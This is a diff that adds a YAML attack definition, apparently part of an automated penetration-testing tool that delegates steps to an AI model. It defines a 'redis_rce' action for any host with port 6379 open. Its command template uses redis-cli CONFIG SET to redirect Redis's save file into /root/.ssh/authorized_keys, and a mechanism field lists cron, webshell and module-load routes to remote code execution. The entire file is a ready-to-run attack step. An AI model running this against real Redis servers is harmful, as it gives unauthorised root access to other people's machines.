@@ -1,0 +1,16 @@
+name: redis_rce
+category: services
+description: Redis RCE via module/cron/ssh
+preconditions:
+  - service.port==6379
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "redis-cli -h {target_ip} CONFIG SET dir /root/.ssh && redis-cli -h {target_ip} CONFIG SET dbfilename authorized_keys"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Redis RCE methods: (1) Write SSH key to authorized_keys, (2) Write cron job, (3) Write webshell via dir/dbfilename, (4) Module load for native code execution."
